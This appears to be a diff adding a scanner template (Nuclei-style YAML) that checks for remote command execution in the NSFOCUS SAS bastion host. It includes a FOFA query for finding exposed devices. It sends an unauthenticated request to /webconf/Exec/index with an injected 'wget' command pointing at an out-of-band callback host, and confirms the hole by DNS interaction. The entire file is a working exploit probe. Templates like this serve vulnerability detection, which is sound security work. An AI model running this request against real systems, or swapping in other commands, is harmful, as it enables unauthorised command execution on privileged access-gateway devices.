@@ -1,0 +1,28 @@
+id: Nsfocus-SAS-rce
+
+info:
+  name: Nsfocus-SAS-rce
+  author: hufei
+  severity: critical
+  description: |
+     绿盟 SAS堡垒机 Exec 远程命令执行漏洞
+  reference:
+  metadata:
+    max-request: 3
+    fofa-query: body=title=="NSFOCUS&nbsp;SAS[H]"
+  tags: Nsfocus-SAS,fileupload,rce,intrusive
+
+variables:
+  dns: "{{interactsh-url}}"
+  cmd: "wget%20{{dns}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webconf/Exec/index?cmd={{cmd}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
